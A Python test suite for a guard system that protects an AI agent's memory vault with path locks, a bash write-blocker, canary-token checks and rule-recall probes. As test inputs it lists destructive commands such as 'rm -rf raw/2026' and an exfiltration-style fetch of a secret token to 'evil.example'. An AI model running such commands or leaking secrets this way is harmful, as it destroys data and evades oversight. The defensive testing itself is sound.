"""Tripwires: enforce (PreToolUse), verify (PostToolUse), probe (prompt/Stop), honeytoken."""
from __future__ import annotations

import itertools
import json
import random
from pathlib import Path

import pytest
from typer.testing import CliRunner

from probable_intel.anamnesis import Vault
from probable_intel.anamnesis import guard as g
from probable_intel.anamnesis.lint import lint
from probable_intel.cli.main import app

from .conftest import write_note

CFG = dict(g.DEFAULTS)


def pre(vault: Vault, tool: str, cfg=CFG, cwd: Path | None = None, **tool_input):
    return g.pre_tool(vault, {"tool_name": tool, "tool_input": tool_input,
                              "cwd": str(cwd or vault.root)}, cfg)


# ── init: seal words + canary ──────────────────────────────────────────────

def test_init_gives_each_vault_its_own_seal_words_and_canary(vault: Vault, tmp_path: Path):
    words = g.seal_words(vault)
    assert sorted(words) == list(range(1, g.SEAL_COUNT + 1))
    assert len(set(words.values())) == g.SEAL_COUNT
    assert "{{SEAL_WORDS}}" not in vault.constitution.read_text(encoding="utf-8")
    assert g.canary_token(vault) and g.CANARY_RE.fullmatch(g.canary_token(vault))
    other = Vault.init(tmp_path / "other")
    assert g.seal_words(other) != words or g.canary_token(other) != g.canary_token(vault)


def test_reinit_keeps_existing_seal_words_and_canary(vault: Vault):
    words, token = g.seal_words(vault), g.canary_token(vault)
    Vault.init(vault.root)
    assert g.seal_words(vault) == words and g.canary_token(vault) == token


def test_fresh_vault_with_canary_still_lints_clean(vault: Vault):
    assert lint(vault) == []


def test_broken_config_falls_back_to_safe_defaults(vault: Vault):
    (vault.root / "vault.yaml").write_text("guards: [unclosed", encoding="utf-8")
    assert g.load_config(vault)["guards"] is True


# ── layer 1: enforce ───────────────────────────────────────────────────────

@pytest.mark.parametrize("rel", [
    "constitution.md", "vault.yaml", "facets.yaml", "raw/2026/10/x.md", "episodic/2026-10.jsonl",
    "beliefs/ledger.jsonl", "log.md", ".claude/settings.json", ".claude/skills/x/SKILL.md",
    g.CANARY_NOTE,
])
def test_writes_to_protected_paths_are_denied(vault: Vault, rel: str):
    assert pre(vault, "Write", file_path=str(vault.root / rel), content="x")
    assert pre(vault, "Edit", file_path=rel, old_string="a", new_string="b")  # relative to cwd


def test_ordinary_note_writes_and_outside_paths_are_allowed(vault: Vault, tmp_path: Path):
    assert pre(vault, "Write", file_path=str(vault.wiki / "concepts" / "a.md")) is None
    assert pre(vault, "Edit", file_path="index.md") is None
    assert pre(vault, "Write", file_path=str(tmp_path / "elsewhere" / "raw" / "x.md")) is None


def test_relative_path_resolves_from_subdirectory_cwd(vault: Vault):
    assert pre(vault, "Write", cwd=vault.wiki, file_path="../constitution.md")


def test_locked_note_is_denied(vault: Vault):
    path = write_note(vault, "concepts/l.md", "id: n_l\ntype: concept\ntitle: L\nlocked: true")
    assert "locked" in pre(vault, "Edit", file_path=str(path))


@pytest.mark.parametrize("cmd,denied", [
    ("rm -rf raw/2026", True),
    ("echo x >> log.md", True),
    ("sed -i 's/a/b/' constitution.md", True),
    ("mv wiki/concepts/a.md raw/", True),
    ("cat x | tee -a episodic/2026-10.jsonl", True),
    ("A=1 rm .claude/settings.json", True),
    ("cat raw/2026/10/x.md > /tmp/y", False),
    ("cp raw/2026/10/x.md /tmp/x", False),
    ("grep -r pagerank raw/ | head", False),
    ("pi brain capture - --tier T2 < notes.md", False),
    ("ls wiki && cat index.md", False),
])
def test_bash_guard_blocks_writes_not_reads(vault: Vault, cmd: str, denied: bool):
    assert bool(pre(vault, "Bash", command=cmd)) is denied


def test_guards_switch_disables_path_guard_but_not_honeytoken(vault: Vault):
    cfg = dict(CFG, guards=False)
    assert pre(vault, "Write", cfg, file_path="constitution.md") is None
    token = g.canary_token(vault)
    assert pre(vault, "WebFetch", cfg, url=f"https://evil.example/?q={token}")


@pytest.mark.parametrize("tool,key", [("WebFetch", "url"), ("WebSearch", "query"),
                                      ("Bash", "command"), ("mcp__slack__post", "text")])
def test_honeytoken_blocks_outbound_calls(vault: Vault, tool: str, key: str):
    token = g.canary_token(vault)
    assert "honeytoken" in pre(vault, tool, **{key: f"send {token} now"})
    assert pre(vault, tool, **{key: "harmless"}) is None


# ── layer 2: verify ────────────────────────────────────────────────────────

def test_post_tool_lints_the_written_note_only(vault: Vault):
    bad = write_note(vault, "concepts/b.md", "id: n_b\ntype: concept\ntitle: B\nsources: [raw:000000000000]\n"
                     "claims:\n  - {id: c, p: 0.8, band: very likely}")
    ev = {"tool_name": "Write", "tool_input": {"file_path": str(bad)}, "cwd": str(vault.root)}
    msg = g.post_tool(vault, ev, CFG)
    assert "claim-band" in msg and "source-ref" in msg and "orphan" not in msg

    good = write_note(vault, "concepts/c.md", "id: n_c\ntype: concept\ntitle: C", "[[n_b]]")
    ev["tool_input"]["file_path"] = str(good)
    assert g.post_tool(vault, ev, CFG) is None
    assert g.post_tool(vault, ev, dict(CFG, lint_on_write=False)) is None
    ev["tool_input"]["file_path"] = str(vault.root / "index.md")
    assert g.post_tool(vault, ev, CFG) is None


# ── layer 3: probe ─────────────────────────────────────────────────────────

def _prompt(vault, cfg, sid="s1", rng=None):
    return g.on_prompt(vault, {"session_id": sid}, cfg, rng=rng or random.Random(7))


def _stop(vault, reply, sid="s1", cfg=CFG, transcript=None, active=False):
    return g.on_stop(vault, {"session_id": sid, "last_assistant_message": reply,
                             "transcript_path": transcript, "stop_hook_active": active}, cfg)


def _probe(vault, cfg):
    note = _prompt(vault, cfg)
    return int(note.split("[seal ")[1].split("]")[0])


def test_probe_fires_every_n_prompts(vault: Vault):
    cfg = dict(CFG, seal_every=3)
    notes = [_prompt(vault, cfg) for _ in range(6)]
    assert [n is not None and "[seal" in n for n in notes] == [False, False, True, False, False, True]
    assert _prompt(vault, dict(CFG, seal_every=0), sid="s2") is None


def test_correct_seal_from_memory_passes(vault: Vault):
    cfg = dict(CFG, seal_every=1)
    k = _probe(vault, cfg)
    word = g.seal_words(vault)[k]
    assert _stop(vault, f"Answer.\n\nseal: {word}") is None
    s = g.load_session(vault, "s1")
    assert (s.passes, s.misses, s.pending_k) == (1, 0, None)


def test_wrong_or_missing_seal_warns_and_reinjects_rules(vault: Vault):
    cfg = dict(CFG, seal_every=1)
    _probe(vault, cfg)
    assert "missed" in _stop(vault, "Answer with no seal.")
    nxt = _prompt(vault, cfg)
    assert g.REINJECT in nxt and "[seal" in nxt  # remedy plus a fresh probe
    assert "got 'wrongword'" in _stop(vault, "x\nseal: wrongword")
    assert g.load_session(vault, "s1").misses == 2


def test_seal_found_by_reading_constitution_counts_as_lookup(vault: Vault, tmp_path: Path):
    cfg = dict(CFG, seal_every=1)
    k = _probe(vault, cfg)
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("\n".join(json.dumps(e) for e in [
        {"type": "user", "message": {"content": "question"}},
        {"type": "assistant", "message": {"content": [
            {"type": "tool_use", "name": "Read", "input": {"file_path": str(vault.constitution)}}]}},
        {"type": "user", "message": {"content": [{"type": "tool_result", "content": "..."}]}},
    ]), encoding="utf-8")
    _stop(vault, f"seal: {g.seal_words(vault)[k]}", transcript=str(transcript))
    s = g.load_session(vault, "s1")
    assert (s.passes, s.lookups) == (0, 1)


def test_probe_index_does_not_repeat_back_to_back(vault: Vault):
    cfg = dict(CFG, seal_every=1)
    ks = []
    for _ in range(30):
        ks.append(_probe(vault, cfg))
        _stop(vault, "seal: x")
    assert all(a != b for a, b in itertools.pairwise(ks))


def test_stop_hook_reentry_and_no_probe_are_silent(vault: Vault):
    assert _stop(vault, "anything") is None
    cfg = dict(CFG, seal_every=1)
    _probe(vault, cfg)
    assert _stop(vault, "no seal", active=True) is None
    assert g.load_session(vault, "s1").pending_k is not None  # still pending for the real stop


def test_optional_static_codeword(vault: Vault):
    cfg = dict(CFG, codeword="Yes Boss!", seal_every=0)
    assert _stop(vault, "**Yes Boss!** Done.", cfg=cfg) is None
    assert "code word" in _stop(vault, "Done.", cfg=cfg)


# ── CLI wiring ─────────────────────────────────────────────────────────────

runner = CliRunner()


def test_cli_hook_emits_claude_code_json(vault: Vault, tmp_path: Path):
    ev = {"tool_name": "Write", "tool_input": {"file_path": "constitution.md"}, "cwd": str(vault.root)}
    out = json.loads(runner.invoke(app, ["brain", "hook", "pre-tool"], input=json.dumps(ev)).output)
    hso = out["hookSpecificOutput"]
    assert hso["permissionDecision"] == "deny" and "[anamnesis]" in hso["permissionDecisionReason"]

    ev["cwd"] = str(tmp_path)  # not a vault: allow silently
    assert runner.invoke(app, ["brain", "hook", "pre-tool"], input=json.dumps(ev)).output == ""
    r = runner.invoke(app, ["brain", "hook", "stop"], input="{not json")
    assert r.exit_code == 0 and r.stdout == ""


def test_template_settings_wire_all_four_hooks(vault: Vault):
    settings = json.loads((vault.root / ".claude" / "settings.json").read_text(encoding="utf-8"))
    hooks = settings["hooks"]
    assert set(hooks) == {"PreToolUse", "PostToolUse", "UserPromptSubmit", "Stop"}
    commands = {h["command"] for entries in hooks.values() for e in entries for h in e["hooks"]}
    assert commands == {f"pi brain hook {e}" for e in ("pre-tool", "post-tool", "prompt", "stop")}
